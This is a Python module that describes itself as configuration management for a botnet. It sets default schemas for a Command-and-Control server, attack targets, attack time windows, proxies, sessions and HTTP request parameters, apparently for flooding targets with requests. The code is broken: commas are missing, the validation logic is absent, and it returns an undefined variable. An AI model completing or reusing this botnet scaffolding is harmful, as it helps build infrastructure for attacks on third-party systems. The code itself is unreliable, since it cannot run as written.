"""
This is the set of functions built with the aim to provide a simple
interface for the configuration management for the botnet instance.
It will provide access to the Command-and-Control server as well as
the validation for the configuration dictionary.

Created:    29 December 2016
Modified:   29 December 2016
"""

import json
import requests
from time import time

def validateConfigFile(config_file):
    """
    This utility is the entry point for every configuration 
    validation. It requires a configuration file to be passed 
    to be validated via C&C and using a particular schema 

    @param config_file, string - path to the configuration .txt or .json
    @return configuration, dictionary or None if error occurs
    """
    # presetting the root schema for the configuration dictionary
    # (default values provided for startup routine)
    rootSchema = {
        "last_modified" : round(time()),
        "cc_server"     : "",
        "user-agent_b"  : "ALLSAFE_UADEFAULT",
        "log_file"      : "../log.txt",

        "targets"       : []
    }
    # presetting the target schema for the configuration dictionary
    targetSchema = {
        "period"            : 1,
        "max_count"         : 1,
        "proxy_server"      : { "http" : "", "https" : "" }
        "action_conditions" : { "AM" : 1, "PM" : 1, "attack_time" : "0-24", "avoid_week" : [], "avoid_month" : [] }
        "request_params"    : {},
        "sessions"          : 1
    }
    # presetting the request_params schema for the configuration dictionary
    requestSchema = {
        "method"     : "GET",
        "url"        : "",
        "user-agent" : "",
        "encoding"   : "UTF-8",
        "payload"    : {},
        "response"   : "raw",
        "response-header" : 0
    }



    return configuration